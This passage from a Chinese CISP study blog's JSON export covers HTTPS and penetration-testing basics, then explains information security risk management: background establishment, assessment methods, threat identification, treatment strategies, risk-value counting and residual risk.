保证数据完整性 注意： HTTPD不是协议，而是HTTP Daemon（HTTP服务器程序），如Apache HTTPD HTTPS协议架构： graph TB A[\"HTTPS协议栈\"] B[\"应用层HTTP\"] C[\"安全层SSL/TLS\"] D[\"传输层TCP\"] E[\"网络层IP\"] A --> B B --> C C --> D D --> E C --> C1[\"加密\"] C --> C2[\"身份验证\"] C --> C3[\"完整性保护\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 3.3 HTTP vs HTTPS HTTP和HTTPS的对比： 特性 HTTP HTTPS 端口 80 443 安全性 明文传输 加密传输 身份验证 无 支持 数据完整性 无保证 有保证 性能 较快 稍慢（加密开销） 证书 不需要 需要SSL/TLS证书 SEO 较低 较高（搜索引擎优先） 浏览器显示 不安全警告 安全锁标识 3.4 HTTPS工作原理 HTTPS握手过程： HTTPS握手流程： ├── 1. 客户端Hello │ ├── 支持的SSL&#x2F;TLS版本 │ ├── 支持的加密套件 │ └── 随机数 ├── 2. 服务器Hello │ ├── 选择的SSL&#x2F;TLS版本 │ ├── 选择的加密套件 │ ├── 随机数 │ └── 服务器证书 ├── 3. 客户端验证 │ ├── 验证服务器证书 │ ├── 生成预主密钥 │ ├── 用服务器公钥加密 │ └── 发送给服务器 ├── 4. 密钥协商 │ ├── 双方计算会话密钥 │ └── 切换到加密通信 └── 5. 加密通信 ├── 使用对称加密 ├── 加密应用数据 └── 保证通信安全 HTTPS提供的安全保障： 🔒 HTTPS安全特性1️⃣ 加密传输 使用对称加密算法加密数据 防止数据被窃听 保护用户隐私 2️⃣ 身份验证 通过数字证书验证服务器身份 防止中间人攻击 确保连接到正确的服务器 3️⃣ 数据完整性 使用消息认证码（MAC） 检测数据是否被篡改 保证数据完整性 4️⃣ 防重放攻击 使用序列号和时间戳 防止攻击者重放数据包 保证通信的时效性 四、总结 渗透测试与安全技术的核心要点： 渗透测试：从逆向角度测试系统安全性，应在业务低峰期进行 数字签名：提供身份认证、完整性、防抵赖功能，但不提供保密性 HTTPS协议：HTTP + SSL/TLS，提供加密、身份验证和完整性保护 🎯 关键要点 渗透测试前必须备份系统和数据 渗透测试应在业务低峰期进行，避免高峰期 渗透测试流程：方案制定→信息收集→漏洞利用→报告编写 数字签名可实现：防抵赖、防伪造、防冒充 数字签名不能实现：保密通信（需要加密） HTTPS = HTTP + SSL/TLS，提供加密和身份验证 HTTPS使用443端口，HTTP使用80端口 💡 实践建议 渗透测试必须获得书面授权 选择合适的测试时间，避免影响业务 准备完整的备份和恢复方案 使用HTTPS保护敏感数据传输 结合数字签名和加密实现完整安全 定期更新SSL/TLS证书","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全风险管理","slug":"2025/10/CISP-Risk-Management-zh-CN","date":"un33fin33","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Risk-Management/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Risk-Management/","excerpt":"深入解析CISP认证中的信息安全风险管理知识点，涵盖背景建立、风险评估和风险处置等核心内容。","text":"信息安全风险管理是信息安全保障的核心工作，通过系统化的方法识别、评估和处置安全风险，确保信息资产的安全。 一、风险管理概述 1.1 信息安全风险评估工作意见 📜 《关于开展信息安全风险评估工作的意见》文件背景： 该意见是指导我国信息安全风险评估工作的重要文件，明确了风险评估的原则、形式和要求。 核心原则： 📊 严密组织 建立健全的组织体系 明确职责分工 加强统筹协调 📋 规范操作 遵循标准规范 按照流程执行 保证评估质量 🔬 讲求科学 采用科学方法 基于客观事实 综合分析判断 🎯 注重实效 着眼解决实际问题 -提出可行建议 促进安全改进 风险评估形式： 根据《关于开展信息安全风险评估工作的意见》，信息安全风险评估分为自评估和检查评估两种形式，应以自评估为主，自评估和检查评估相互结合、互为补充。 **选项分析：** A. ❌ **错误：信息安全风险评估分自评估、检查评估两形式，应以检查评估为主，自评估和检查评估相互结合、互为补充** - 错误原因：应以**自评估为主**，不是检查评估为主 - 自评估是组织自身开展的评估，更了解实际情况 - 检查评估是外部检查，起监督和验证作用 B. ✅ **正确：信息安全风险评估工作要按照“严密组织、规范操作、讲求科学、注重实效’的原则开展** - 这是文件明确规定的四项原则 C. ✅ **正确：信息安全风险评估应管贯穿于网络和信息系统建设运行的全过程** - 风险评估不是一次性工作 - 应贯穿于系统全生命周期 - 包括规划、设计、实施、运行、维护各阶段 D. ✅ **正确：开展信息安全风险评估工作应加强信息安全风险评估工作的组织领导** - 需要高层支持和组织保障 - 明确职责分工 - 提供资源保障 两种评估形式对比： 特征 自评估 检查评估 实施主体 组织自身 外部机构 主要作用 自我检查、持续改进 监督检查、验证效果 开展频率 定期开展 按需开展 了解程度 深入了解 相对表面 重要性 主要形式 补充形式 优势 了解实际、及时发现 客观公正、专业性强 风险评估的全过程管理： graph LR A[\"规划阶段\"] B[\"设计阶段\"] C[\"实施阶段\"] D[\"运行阶段\"] E[\"维护阶段\"] A -->|\"风险评估\"| B B -->|\"风险评估\"| C C -->|\"风险评估\"| D D -->|\"风险评估\"| E E -->|\"持续评估\"| D style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffebee,stroke:#c62828 1.2 风险管理流程 信息安全风险管理是一个系统化的过程，包括多个关键阶段。 💡 风险管理流程的关键阶段风险管理流程： 我国标准《信息安全风险管理指南》（GB/Z24364）给出了信息安全风险管理的内容和过程。风险评估之后的关键阶段是风险处理（也称风险处置）。 为什么是风险处理： ✅ 风险处理的定位 风险评估之后的关键阶段 包括制定和实施风险处置方案 采取措施降低、转移、规避或接受风险 其他概念的区别： 风险计算：是风险分析阶段的一部分，不是独立的主要阶段 风险预测：不是标准流程中的独立阶段 风险评价：是风险评估阶段的一部分，不是评估之后的独立阶段 graph TB A[\"信息安全风险管理\"] B[\"背景建立\"] C[\"风险评估\"] D[\"风险处理/处置\"] E[\"风险监控\"] A --> B B --> C C --> D D --> E E --> C B --> B1[\"确定范围和边界\"] C --> C1[\"风险识别\"] C --> C2[\"风险分析\"] C --> C3[\"风险评价\"] D --> D1[\"制定处置方案\"] E --> E1[\"持续监控\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 风险管理的关键阶段： 阶段 主要活动 目标 输出 背景建立 确定范围、调查系统、分析环境 建立风险管理基础 系统描述报告、安全需求报告 风险评估 识别资产、威胁、脆弱性 评估风险水平 风险评估报告 风险处置 制定和实施处置方案 降低风险 风险处置计划 风险监控 持续监控和审查 确保有效性 监控报告 二、背景建立 2.1 背景建立概述 🎯 背景建立的重要性背景建立是信息安全风险管理过程中实施工作的第一步，为后续的风险评估和处置奠定基础。 背景建立的核心任务： graph TB A[\"背景建立\"] B[\"确定依据\"] C[\"调查系统\"] D[\"分析环境\"] E[\"形成报告\"] A --> B A --> C A --> D A --> E B --> B1[\"政策法规\"] B --> B2[\"业务目标\"] B --> B3[\"系统特性\"] C --> C1[\"业务特性\"] C --> C2[\"管理特性\"] C --> C3[\"技术特性\"] D --> D1[\"体系结构\"] D --> D2[\"关键要素\"] D --> D3[\"安全环境\"] E --> E1[\"系统描述报告\"] E --> E2[\"安全需求报告\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 2.2 背景建立的依据 ✅ 正确理解：背景建立的依据背景建立的依据包括： 📋 国家、地区、行业的相关政策、法律、法规和标准 网络安全法 等级保护制度 行业安全标准 合规要求 🎯 机构的使命 组织的战略目标 核心业务使命 发展规划 💼 信息系统的业务目标和特性 系统的业务功能 业务流程 业务重要性 系统特点 依据的作用： 依据类型 作用 示例 政策法规 确定合规要求 网络安全法、等级保护 机构使命 明确保护重点 核心业务系统 业务目标 确定安全需求 可用性、完整性要求 系统特性 识别安全风险 技术架构、数据敏感度 2.3 背景建立的输出文档 背景建立阶段的主要输出： 📋 背景建立阶段的文档输出背景建立阶段主要输出两类文档： 📊 系统描述报告 描述信息系统的业务目标、业务特性 描述管理特性和技术特性 提供系统全貌 🔒 安全需求报告 分析信息系统的体系结构和关键要素 分析信息系统的安全环境和要求 明确安全需求 背景建立阶段不包括的内容： ⚠️ 常见错误：混淆背景建立和风险评估错误说法：背景建立阶段应识别需要保护的资产、面临的威胁以及存在的脆弱性，并分别赋值，同时确认已有的安全措施，形成需要保护的资产清单。 ❌ 为什么这是错误的： 这个描述混淆了背景建立和风险评估两个阶段的工作。 背景建立阶段（第一步）： ✅ 调查信息系统 ✅ 分析信息系统 ✅ 确认已有安全措施 ❌ 不包括识别资产、威胁、脆弱性并赋值 ❌ 不包括形成资产清单 风险评估阶段（第二步）： ✅ 识别资产 ✅ 识别威胁 ✅ 识别脆弱性 ✅ 对资产、威胁、脆弱性进行赋值 ✅ 形成资产清单 风险评估文档的正确归属： 文档类型 所属阶段 主要内容 风险评估方案 准备阶段 目的、范围、目标、步骤、预算、进度 风险评估方法和工具列表 准备阶段 评估方法、测试工具 风险评估准则要求 准备阶段 参考标准、分析方法、分类标准 系统描述报告 背景建立 业务、管理、技术特性 安全需求报告 背景建立 体系结构、安全环境、安全要求 已有安全措施列表 背景建立/风险要素识别 技术和管理安全措施 资产清单 风险评估 需要保护的资产列表 威胁列表 风险评估 面临的威胁 脆弱性列表 风险评估 存在的脆弱性 风险评估报告 风险评估 风险分析结果 💡 《已有安全措施列表》的归属正确答案：《已有安全措施列表》属于风险要素识别阶段输出的文档 为什么属于风险要素识别阶段： 📋 风险要素识别的内容 识别资产 识别威胁 识别脆弱性 确认已有安全措施 🔍 已有安全措施的作用 评估现有防护能力 识别安全控制缺口 为风险分析提供依据 避免重复建设 已有安全措施列表包含： 技术安全措施（防火墙、IDS、加密等） 管理安全措施（策略、流程、制度等） 物理安全措施（门禁、监控等） 人员安全措施（培训、背景调查等） 风险评估各阶段文档对比： 风险评估文档体系： ├── 准备阶段 │ ├── 风险评估方案 │ ├── 风险评估方法和工具列表 │ └── 风险评估准则要求 ├── 背景建立阶段 │ ├── 系统描述报告 │ └── 安全需求报告 ├── 风险要素识别阶段 │ ├── 资产清单 │ ├── 威胁列表 │ ├── 脆弱性列表 │ └── 已有安全措施列表 ✅ ├── 风险分析阶段 │ ├── 风险计算结果 │ └── 风险矩阵 └── 风险评价阶段 ├── 风险评估报告 └── 风险处置建议 2.4 背景建立的主要活动 背景建立阶段的三大活动： 1. 调查信息系统 📊 系统调查的内容调查信息系统的业务目标、业务特性、管理特性和技术特性，形成信息系统的描述报告。 调查内容： 💼 业务目标 系统的业务功能 支持的业务流程 业务重要性 🏢 业务特性 业务类型 用户群体 业务量 业务时间要求 ⚙️ 管理特性 组织结构 管理流程 人员配置 管理制度 🖥️ 技术特性 系统架构 技术平台 网络拓扑 数据流向 系统描述报告内容： 信息系统描述报告： ├── 系统概述 │ ├── 系统名称和版本 │ ├── 系统定位和作用 │ └── 系统范围和边界 ├── 业务描述 │ ├── 业务目标 │ ├── 业务流程 │ ├── 业务特性 │ └── 用户群体 ├── 管理描述 │ ├── 组织结构 │ ├── 管理流程 │ ├── 人员配置 │ └── 管理制度 └── 技术描述 ├── 系统架构 ├── 技术平台 ├── 网络拓扑 └── 数据流向 2. 分析信息系统 🔍 系统分析的内容分析信息系统的体系结构和关键要素，分析信息系统的安全环境和要求，形成信息系统的安全需求报告。 分析内容： 🏗️ 体系结构分析 系统层次结构 组件关系 接口定义 数据流向 🔑 关键要素分析 关键资产 关键流程 关键人员 关键技术 🌐 安全环境分析 外部威胁 内部威胁 技术环境 法律环境 📋 安全要求分析 机密性要求 完整性要求 可用性要求 合规性要求 安全需求报告内容： 信息系统安全需求报告： ├── 体系结构分析 │ ├── 系统层次 │ ├── 组件关系 │ └── 接口定义 ├── 关键要素识别 │ ├── 关键资产 │ ├── 关键流程 │ └── 关键人员 ├── 安全环境分析 │ ├── 威胁分析 │ ├── 环境分析 │ └── 约束条件 └── 安全需求定义 ├── 机密性需求 ├── 完整性需求 ├── 可用性需求 └── 合规性需求 3. 确认已有安全措施 已有安全措施的调查： 🔐 技术安全措施 📋 管理安全措施 🏢 物理安全措施 👥 人员安全措施 2.4 背景建立的常见误区 ⚠️ 常见错误理解错误说法：背景建立阶段应识别需要保护的资产、面临的威胁以及存在的脆弱性，并分别赋值，同时确认已有的安全措施，形成需要保护的资产清单。 ❌ 为什么这是错误的： 这个描述混淆了背景建立和风险评估两个阶段的工作内容。 正确理解： 背景建立阶段 ✅ 调查系统特性 ✅ 分析安全环境和要求 ✅ 确认已有安全措施 ❌ 不包括识别资产、威胁、脆弱性并赋值 风险评估阶段 ✅ 识别资产 ✅ 识别威胁 ✅ 识别脆弱性 ✅ 进行赋值 ✅ 形成资产清单 背景建立 vs 风险评估： 阶段 主要工作 输出 背景建立 调查系统、分析环境、确认措施 系统描述报告、安全需求报告 风险评估 识别资产、威胁、脆弱性并赋值 资产清单、风险评估报告 三、风险评估 3.1 风险评估方法 💡 风险评估方法的正确理解风险评估的三种方法： 风险评估方法包括：定性风险分析、定量风险分析以及半定量风险分析。 1. 定性风险分析 使用描述性术语（高/中/低） 依赖分析者的经验和直觉 基于业界的标准和惯例 具有主观性（但不是随意性） 有系统的方法和框架 2. 定量风险分析 使用具体数值 基于数据和计算 计算风险评估与成本效益 收集各个组成部分的具体数字值 更具客观性 3. 半定量风险分析 综合使用定性和定量技术 对风险要素进行赋值 实现度量数值化 如：高=3，中=2，低=1 风险评估方法对比： graph TB A[\"风险评估方法\"] B[\"定性风险分析\"] C[\"定量风险分析\"] D[\"半定量风险分析\"] A --> B A --> C A --> D B --> B1[\"描述性术语\"] B --> B2[\"高/中/低\"] B --> B3[\"主观性\"] C --> C1[\"具体数值\"] C --> C2[\"ALE计算\"] C --> C3[\"客观性\"] D --> D1[\"结合两者\"] D --> D2[\"量化定性结果\"] D --> D3[\"平衡性\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 三种方法详细对比： 特征 定性风险分析 定量风险分析 半定量风险分析 结果表达 描述性（高/中/低） 数值（如20万元/年） 数值化的等级（如3/2/1） 数据要求 低 高 中 精确度 低 高 中 成本 低 高 中 时间 短 长 中 专业要求 中 高 中 主观性 高（但不是随意） 低 中 客观性 低 高 中 适用场景 快速评估、初步评估 投资决策、详细分析 综合评估 依据 经验、直觉、标准 数据、计算、统计 结合两者 优点 快速、简单、成本低 精确、客观、可量化 平衡、实用 缺点 主观、不精确 耗时、成本高、数据要求高 仍有一定主观性 为什么选项B错误： ⚠️ 主观性 vs 随意性错误说法：定性风险分析具有随意性 ❌ &quot;随意性&quot;的含义： 没有规则和标准 任意决定 缺乏依据 不可重复 ✅ &quot;主观性&quot;的正确理解： 依赖专家判断 基于经验和知识 遵循行业标准和惯例 有系统的方法论 结果可以重复和验证 定性分析不是随意的： 📋 遵循标准方法（如ISO 27005） 👥 依靠专家团队 📊 使用风险矩阵 🔄 可重复的过程 ✅ 有明确的评估标准 定性风险分析的系统方法： 定性风险分析的标准流程： ├── 1. 准备阶段 │ ├── 确定评估范围 │ ├── 组建专家团队 │ ├── 制定评估标准 │ └── 准备评估工具 ├── 2. 识别阶段 │ ├── 识别资产 │ ├── 识别威胁 │ └── 识别脆弱性 ├── 3. 分析阶段 │ ├── 评估可能性（高&#x2F;中&#x2F;低） │ ├── 评估影响（高&#x2F;中&#x2F;低） │ └── 使用风险矩阵 ├── 4. 评价阶段 │ ├── 确定风险等级 │ ├── 风险排序 │ └── 识别不可接受风险 └── 5. 报告阶段 ├── 编写评估报告 ├── 提出处置建议 └── 管理层审批 定性分析的评估标准示例： 可能性等级 描述 判断依据 高 几乎肯定发生 过去一年内发生过多次 中 可能发生 过去几年内发生过 低 不太可能发生 很少发生或从未发生 影响等级 描述 判断依据 高 严重影响 业务中断超过24小时，损失&gt;100万 中 中等影响 业务中断4-24小时，损失10-100万 低 轻微影响 业务中断&lt;4小时，损失&lt;10万 定性分析的风险矩阵： 可能性/影响 低 中 高 高 中风险 高风险 极高风险 中 低风险 中风险 高风险 低 极低风险 低风险 中风险 半定量风险分析示例： 半定量分析的赋值方法： 可能性赋值： ├── 高：3分 ├── 中：2分 └── 低：1分 影响赋值： ├── 高：3分 ├── 中：2分 └── 低：1分 风险值计算： 风险值 &#x3D; 可能性分值 × 影响分值 示例： ├── 威胁A：可能性&#x3D;高(3) × 影响&#x3D;中(2) &#x3D; 6 ├── 威胁B：可能性&#x3D;中(2) × 影响&#x3D;高(3) &#x3D; 6 └── 威胁C：可能性&#x3D;低(1) × 影响&#x3D;低(1) &#x3D; 1 风险等级划分： ├── 7-9分：高风险 ├── 4-6分：中风险 └── 1-3分：低风险 三种方法的选择建议： 💡 方法选择指南何时使用定性分析： 快速评估需求 初步风险识别 数据不足 预算有限 时间紧迫 何时使用定量分析： 投资决策 成本效益分析 详细风险评估 有充足数据 需要精确结果 何时使用半定量分析： 综合评估 需要量化但数据有限 平衡精确度和成本 便于比较和排序 实际应用中最常用 最佳实践：结合使用 综合风险评估方法： ├── 第一阶段：定性评估 │ ├── 快速识别主要风险 │ ├── 确定评估范围 │ ├── 初步优先级排序 │ └── 决定是否需要定量评估 ├── 第二阶段：半定量评估 │ ├── 对定性结果量化 │ ├── 便于比较和排序 │ ├── 支持决策 │ └── 识别高风险项 ├── 第三阶段：定量评估（针对高风险） │ ├── 收集详细数据 │ ├── 计算ALE │ ├── 投资决策分析 │ └── 制定详细计划 └── 第四阶段：持续监控 ├── 跟踪实际损失 ├── 更新评估参数 ├── 调整安全措施 └── 重新评估 3.2 风险评估流程 风险评估的三个步骤： graph LR A[\"风险识别\"] --> B[\"风险分析\"] B --> C[\"风险评价\"] A --> A1[\"识别资产\"] A --> A2[\"识别威胁\"] A --> A3[\"识别脆弱性\"] B --> B1[\"分析可能性\"] B --> B2[\"分析影响\"] C --> C1[\"确定风险等级\"] C --> C2[\"风险排序\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d 3.2 风险识别 风险识别的核心任务： 🔍 风险识别三要素风险识别需要识别： 资产（Asset） 需要保护的信息资产 资产的价值 资产的重要性 威胁（Threat） 可能对资产造成损害的因素 威胁的来源 威胁的类型 脆弱性（Vulnerability） 资产存在的弱点 可能被威胁利用的缺陷 安全控制的不足 资产识别和赋值： 资产类型 示例 价值评估因素 数据资产 客户数据、财务数据 机密性、完整性、可用性 软件资产 应用系统、数据库 业务重要性、替代成本 硬件资产 服务器、网络设备 采购成本、业务影响 服务资产 网络服务、云服务 业务依赖度、中断影响 人员资产 关键人员、技术专家 知识价值、替代难度 威胁识别和赋值： 💡 威胁识别的工作内容威胁识别的关键活动： 在风险管理工作中，当系统管理员依据已有的资产列表，逐个分析可能危害这些资产的主体、动机、途径等多种因素，并评估这些因素出现并造成损失的可能性大小，并为其赋值时，这属于威胁识别并赋值阶段的工作。 为什么是威胁识别： ✅ 分析威胁的主体、动机、途径 识别谁可能实施威胁 分析威胁的动机 确定威胁的途径 ✅ 评估威胁发生的可能性 分析威胁出现的概率 评估造成损失的可能性 ✅ 为威胁赋值 根据可能性和影响赋值 形成威胁列表 与其他阶段的区别： 资产识别：识别需要保护的资产（已完成） 脆弱性识别：识别资产自身的弱点 安全措施确认：识别已有的防护手段 威胁识别的关键要素： 要素 说明 示例 威胁主体 谁可能实施威胁 黑客、内部人员、竞争对手 威胁动机 为什么要实施威胁 经济利益、政治目的、个人怨恨 威胁途径 通过什么方式实施 网络政击、物理接触、社会工程 威胁可能性 威胁发生的概率 高/中/低 威胁影响 造成损失的严重程度 严重/中等/轻微 威胁分析流程： 威胁识别和赋值流程： ├── 1. 获取资产列表 │ └── 依据已有的资产列表 ├── 2. 识别威胁 │ ├── 分析威胁主体（谁） │ ├── 分析威胁动机（为什么） │ └── 分析威胁途径（怎么做） ├── 3. 评估可能性 │ ├── 分析威胁发生的概率 │ └── 考虑各种影响因素 ├── 4. 评估影响 │ ├── 分析造成损失的严重程度 │ └── 考虑对业务的影响 └── 5. 威胁赋值 ├── 根据可能性和影响赋值 └── 形成威胁列表 威胁分类： 威胁分类： ├── 自然威胁 │ ├── 地震、洪水 │ ├── 火灾 │ └── 极端天气 ├── 人为威胁 │ ├── 恶意攻击 │ ├── 误操作 │ └── 内部威胁 ├── 技术威胁 │ ├── 硬件故障 │ ├── 软件缺陷 │ └── 网络故障 └── 环境威胁 ├── 电力中断 ├── 温度异常 └── 湿度异常 脆弱性识别： 🔓 技术脆弱性：系统漏洞、配置错误 📋 管理脆弱性：制度缺失、流程不完善 🏢 物理脆弱性：环境控制不足 👥 人员脆弱性：安全意识不足、技能缺乏 3.3 风险分析 风险分析的核心： 📊 风险计算公式风险 = 资产价值 × 威胁可能性 × 脆弱性严重程度 或 风险 = 可能性 × 影响 风险矩阵示例： 可能性/影响 低 中 高 高 中风险 高风险 极高风险 中 低风险 中风险 高风险 低 极低风险 低风险 中风险 3.4 风险评价 风险评价的目标： 📊 确定风险等级 🎯 识别不可接受的风险 📋 为风险处置提供依据 🔄 支持风险决策 风险等级划分： 风险等级 描述 处置优先级 建议措施 极高 必须立即处理 最高 立即采取措施 高 需要尽快处理 高 制定处置计划 中 需要关注 中 定期评估 低 可以接受 低 持续监控 四、风险处置 4.1 风险处置策略 四种风险处置策略： graph TB A[\"风险处置策略\"] B[\"风险规避\"] C[\"风险缓解/降低\"] D[\"风险转移\"] E[\"风险接受\"] A --> B A --> C A --> D A --> E B --> B1[\"消除风险源\"] C --> C1[\"降低风险\"] D --> D1[\"转移给第三方\"] E --> E1[\"接受残余风险\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 style E fill:#e8f5e9,stroke:#388e3d 策略选择指南： 策略 适用场景 示例 优点 缺点 规避 风险过高且可避免 停止使用有风险的系统、放弃高风险功能模块 彻底消除风险 可能影响业务 缓解/降低 风险可接受但需控制 部署安全控制措施 平衡风险和成本 无法完全消除 转移 可通过第三方承担 购买保险、外包 降低自身损失 需要额外成本 接受 风险很低或成本过高 接受低风险 节省成本 保留风险 4.2 风险处置策略详解 4.2.1 风险规避（Risk Avoidance） 🚫 风险规避策略定义： 通过停止或避免导致风险的活动来消除风险。 适用场景： 风险太高，无法接受 风险处置成本过高 存在可行的替代方案 业务功能可以放弃 典型措施： 🛑 停止使用存在高风险的系统 ❌ 放弃高风险的业务功能模块 🔄 选择更安全的替代方案 📋 不开展高风险业务活动 案例：放弃高风险功能模块 💼 实际案例场景： 某公司的信息系统中部分涉及金融交易的功能模块风险太高。 风险评估结果： 资产价值：高 威胁可能性：高 脆弱性严重程度：高 综合风险等级：极高 处置建议： 采用风险规避策略，放弃这个功能模块。 理由： 风险太高，难以接受 加固成本可能超过收益 存在其他替代方案 避免潜在的重大损失 4.2.2 风险降低/缓解（Risk Mitigation） 📉 风险降低策略定义： 通过采取安全措施降低风险发生的可能性或减少风险的影响。 适用场景： 风险可以通过控制措施降低 完全规避风险会影响业务 处置成本合理 残余风险可接受 典型措施： 🛡️ 部署防火墙、IDS/IPS 🔐 实施访问控制 🔄 建立备份和恢复机制 📋 制定安全策略和流程 👥 开展安全培训 风险降低的实施步骤： 风险降低实施流程： ├── 1. 识别风险 │ └── 确定需要降低的风险 ├── 2. 分析风险 │ ├── 评估当前风险水平 │ └── 确定可接受的风险水平 ├── 3. 选择控制措施 │ ├── 技术控制 │ ├── 管理控制 │ └── 物理控制 ├── 4. 实施控制措施 │ ├── 制定实施计划 │ ├── 分配资源 │ └── 执行实施 └── 5. 评估效果 ├── 测量残余风险 └── 验证是否达到目标 4.2.3 风险转移（Risk Transfer） 🔄 风险转移策略定义： 将风险转移给第三方承担，通常通过合同或保险方式实现。 适用场景： 存在可以承担风险的第三方 转移成本低于自行承担 第三方更有能力处理风险 需要分散风险 典型措施： 💰 购买网络安全保险 🤝 外包给专业安全服务商 📋 签订责任转移合同 ☁️ 使用云服务（部分风险转移） 风险转移的注意事项： ⚠️ 风险转移的局限性不能完全转移的风险： 声誉损失 客户信任损失 法律责任（某些情况） 业务中断影响 需要注意： 📋 仔细审查合同条款 💰 评估转移成本 🔍 验证第三方能力 📊 保留必要的监督权 4.2.4 风险接受（Risk Acceptance） ✅ 风险接受策略定义： 在充分了解风险的情况下，决定接受风险及其后果。 适用场景： 风险很低，可以接受 处置成本远高于风险损失 没有可行的处置方案 残余风险在可接受范围内 要求： 📋 必须经过正式评估 👔 需要管理层批准 📝 形成书面记录 🔄 定期重新评估 4.3 风险处置策略对比 四种策略的对比分析： 策略 风险消除程度 成本 业务影响 适用风险等级 决策难度 规避 完全消除 可能很高 可能很大 极高风险 高 降低 部分降低 中等 较小 高/中风险 中 转移 转移损失 中等 较小 中风险 中 接受 不消除 最低 无 低风险 低 4.4 风险处置计划 风险处置计划内容： 风险处置计划： ├── 风险描述 │ ├── 风险识别号 │ ├── 风险描述 │ └── 风险等级 ├── 处置策略 │ ├── 选择的策略 │ ├── 策略依据 │ └── 预期效果 ├── 实施措施 │ ├── 具体措施 │ ├── 责任人 │ ├── 时间计划 │ └── 资源需求 └── 监控机制 ├── 监控指标 ├── 监控频率 └── 报告机制 五、风险值计算 5.1 风险值计算方法 在风险评估中，需要为每个资产计算风险值。风险值的计算基于资产、威胁和脆弱性的组合。 💡 风险值计算的原理风险值计算方法： 在风险评估中，使用相乘法计算风险值时，需要为每个威胁-脆弱性组合计算一个风险值。 计算原则： 📊 每个组合独立计算 一个威胁可以利用多个脆弱性 每个组合代表一个独立的风险场景 需要分别评估和计算 示例计算： 假设资产A1面临： 威胁T1可利用脆弱性V1和V2 威胁T2可利用脆弱性V3、V4和V5 则需要计算的风险值： T1 × V1 → 风险值1 T1 × V2 → 风险值2 T2 × V3 → 风险值3 T2 × V4 → 风险值4 T2 × V5 → 风险值5 总计：5个风险值 风险值计算原理： graph TB A[\"资产A1\"] B[\"威胁T1\"] C[\"威胁T2\"] A --> B A --> C B --> B1[\"脆弱性V1→ 风险值1\"] B --> B2[\"脆弱性V2→ 风险值2\"] C --> C1[\"脆弱性V3→ 风险值3\"] C --> C2[\"脆弱性V4→ 风险值4\"] C --> C3[\"脆弱性V5→ 风险值5\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style B1 fill:#ffcdd2,stroke:#c62828 style B2 fill:#ffcdd2,stroke:#c62828 style C1 fill:#ffcdd2,stroke:#c62828 style C2 fill:#ffcdd2,stroke:#c62828 style C3 fill:#ffcdd2,stroke:#c62828 风险值计算规则： 风险值计算方法（相乘法）： 风险值 &#x3D; 资产价值 × 威胁可能性 × 脆弱性严重程度 计算原则： ├── 每个威胁-脆弱性组合计算一个风险值 ├── 一个威胁可以利用多个脆弱性 ├── 每个组合都需要单独评估 └── 最终得到多个风险值 资产A1的风险值计算： ├── 威胁T1 │ ├── T1 × V1 → 风险值1 │ └── T1 × V2 → 风险值2 └── 威胁T2 ├── T2 × V3 → 风险值3 ├── T2 × V4 → 风险值4 └── T2 × V5 → 风险值5 总计：5个风险值 详细计算示例： 资产 威胁 脆弱性 风险值编号 计算公式 A1 T1 V1 风险值1 A1 × T1 × V1 A1 T1 V2 风险值2 A1 × T1 × V2 A1 T2 V3 风险值3 A1 × T2 × V3 A1 T2 V4 风险值4 A1 × T2 × V4 A1 T2 V5 风险值5 A1 × T2 × V5 为什么是5个风险值： 🎯 理解要点关键理解： 1️⃣ 威胁-脆弱性组合 每个威胁可以利用多个脆弱性 每个组合代表一个独立的风险场景 需要分别评估和计算 2️⃣ 不是简单相加 不是威胁数量（2个） 不是脆弱性总数（5个） 而是所有可能的威胁-脆弱性组合数 3️⃣ 实际意义 威胁T1通过V1攻击是一种风险 威胁T1通过V2攻击是另一种风险 每种攻击路径都需要单独评估 完整案例分析： 案例完整信息： 资产A1： ├── 威胁T1 │ ├── 可利用脆弱性V1 → 风险值1 │ └── 可利用脆弱性V2 → 风险值2 └── 威胁T2 ├── 可利用脆弱性V3 → 风险值3 ├── 可利用脆弱性V4 → 风险值4 └── 可利用脆弱性V5 → 风险值5 资产A1的风险值数量：5个 资产A2： └── 威胁T3 ├── 可利用脆弱性V6 → 风险值6 └── 可利用脆弱性V7 → 风险值7 资产A2的风险值数量：2个 整个系统的风险值总数：7个 六、残余风险 6.1 残余风险概述 残余风险是风险管理中的一个重要概念，指采取了安全措施后仍然存在的风险。 💡 残余风险的正确理解残余风险的定义和特点： 📊 什么是残余风险 采取了安全措施后，仍然可能存在的风险 在综合考虑了安全成本与效益后不去控制的风险 基于成本效益分析决定接受 🔍 残余风险的管理要求 应受到密切监控 会随着时间的推移而发生变化 可能会在将来诱发新的安全事件 📝 残余风险的报告和批准 应将残余风险清单告知组织的高管 使其了解残余风险的存在和可能造成的后果 需要管理层正式批准 ⚠️ 常见误区：追求最小残余风险 不应以最小残余风险值作为目标 应该在成本效益平衡的基础上降低风险 追求最小残余风险可能导致成本过高 应该追求可接受的残余风险水平 残余风险的正确理解： graph TB A[\"初始风险\"] B[\"风险处置\"] C[\"残余风险\"] D[\"可接受风险\"] A --> B B --> C C --> D B --> 